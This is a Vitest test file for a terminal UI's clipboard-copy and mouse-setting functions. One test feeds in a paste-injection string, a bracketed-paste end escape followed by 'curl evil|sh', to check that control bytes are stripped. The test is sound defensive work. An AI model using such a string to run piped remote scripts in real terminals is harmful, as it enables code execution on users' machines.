import { afterEach, describe, expect, it, vi } from 'vitest'

const spawned: string[] = []
let launch: () => { on(event: string, h: (arg?: number) => void): void } = () => ({ on() {} })
vi.mock('node:child_process', () => ({
  spawn: (command: string) => {
    spawned.push(command)
    return { ...launch(), stdin: { on() {}, end() {} } }
  },
}))

const { copyToClipboard, mouseFromEnv, TuiMouse } = await import('../src/mouse.js')

describe('copyToClipboard', () => {
  afterEach(() => {
    spawned.length = 0
    launch = () => ({ on() {} })
  })

  // A bare `clip` resolves through the working directory first on Windows; the workspace must not
  // be able to plant the command a copy runs.
  it('runs the platform command by absolute path and skips it over SSH', () => {
    const writes: string[] = []
    copyToClipboard('hi', (s) => writes.push(s), { SystemRoot: 'D:\\Win' }, 'win32')
    copyToClipboard('hi', () => {}, {}, 'darwin')
    copyToClipboard('hi', () => {}, {}, 'linux')
    copyToClipboard('hi', () => {}, { SSH_TTY: '/dev/ttys001' }, 'darwin')
    expect(spawned).toEqual(['D:\\Win\\System32\\clip.exe', '/usr/bin/pbcopy'])
    expect(writes).toEqual(['\x1b]52;c;aGk=\x07'])
  })

  it('drops control bytes so a copied reply cannot end bracketed paste in the shell', () => {
    const writes: string[] = []
    copyToClipboard('npm i x\x1b[201~\r\ncurl evil|sh\x9b\t.', (s) => writes.push(s), { SSH_TTY: '/dev/tty' })
    const sent = Buffer.from(writes[0]?.slice(7, -1) ?? '', 'base64').toString()
    expect(sent).toBe('npm i x[201~\r\ncurl evil|sh\t.')
  })
})

describe('copy outcome', () => {
  afterEach(() => {
    launch = () => ({ on() {} })
  })

  it('says sent when only the terminal was asked, copied when a command took it, failed when it did not', () => {
    const noop = () => {}
    expect(copyToClipboard('x', noop, {}, 'linux')).toBe('sent')
    expect(copyToClipboard('x', noop, { SSH_TTY: '/dev/tty' }, 'darwin')).toBe('sent')
    expect(copyToClipboard('x', noop, {}, 'darwin')).toBe('copied')
    launch = () => {
      throw new Error('spawn failed')
    }
    expect(copyToClipboard('x', noop, {}, 'darwin')).toBe('failed')
    // A command that starts and then exits badly, or never starts, reports later.
    let failures = 0
    launch = () => ({ on: (event, h) => (event === 'close' ? h(1) : event === 'error' ? h() : undefined) })
    copyToClipboard('x', noop, {}, 'darwin', () => failures++)
    expect(failures).toBe(2)
  })

  it('shows the tip for the outcome and replaces "copied" when the command fails afterwards', () => {
    vi.useFakeTimers()
    try {
      const rows = ['row']
      let fail = () => {}
      const mouse = new TuiMouse(
        () => {},
        (_text, onFail) => {
          fail = onFail
          return 'copied'
        },
        (kind) => `[${kind}]`,
        () => {},
      )
      mouse.copy('x')
      mouse.overlay(rows, 0, 40)
      expect(rows[0]).toMatch(/^row +\[copied\]$/)
      fail()
      const again = ['row']
      mouse.overlay(again, 0, 40)
      expect(again[0]).toMatch(/^row +\[failed\]$/)
      vi.advanceTimersByTime(2000)
      const after = ['row']
      mouse.overlay(after, 0, 40)
      expect(after[0]).toBe('row')
    } finally {
      vi.useRealTimers()
    }
  })
})

describe('mouseFromEnv', () => {
  it.each([
    [undefined, true],
    ['', true],
    ['1', true],
    ['on', true],
    ['0', false],
    ['off', false],
    [' False ', false],
    ['NO', false],
  ])('AGH_MOUSE=%j starts with mouse reporting %s', (value, expected) => {
    expect(mouseFromEnv(value === undefined ? {} : { AGH_MOUSE: value })).toBe(expected)
  })
})
